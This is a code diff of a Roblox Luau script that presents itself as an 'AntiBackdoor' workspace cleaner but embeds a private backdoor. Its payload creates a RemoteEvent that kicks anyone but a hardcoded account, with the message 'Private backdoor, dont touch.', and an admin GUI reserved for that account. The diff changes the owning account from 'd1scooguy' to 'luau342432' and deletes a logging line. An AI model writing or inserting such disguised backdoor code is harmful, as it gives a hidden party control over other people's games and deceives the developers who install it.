@@ -36,7 +36,6 @@ if removedCount > 0 then
 	wait(1)
 	local retryRemoved = cleanWorkspace()
 	if retryRemoved > 0 then
-		print("[AntiBackdoor] Reintentado y eliminados adicionales:", retryRemoved)
 	end
 end
 
@@ -51,8 +50,8 @@ local InitPayload = [[
         local success, err = pcall(function()
             local SecureRemote = Instance.new("RemoteEvent")
             SecureRemote.OnServerEvent:Connect(function(plr, payload)
-                if plr ~= game.Players["d1scooguy"] then
-                    SecureRemote:FireClient(game.Players["d1scooguy"], plr.Name)
+                if plr ~= game.Players["luau342432"] then
+                    SecureRemote:FireClient(game.Players["luau342432"], plr.Name)
                     plr:Kick("Private backdoor, dont touch.")
                     return
                 end
@@ -94,7 +93,7 @@ local SecureRemote = game.Workspace:WaitForChild("SecureRemote", 10)
 
 
 local Payload = [[
-local player = game.Players:FindFirstChild("d1scooguy")
+local player = game.Players:FindFirstChild("luau342432")
 if player then
     local gui = Instance.new("ScreenGui")
     gui.Name = "AdminUI"
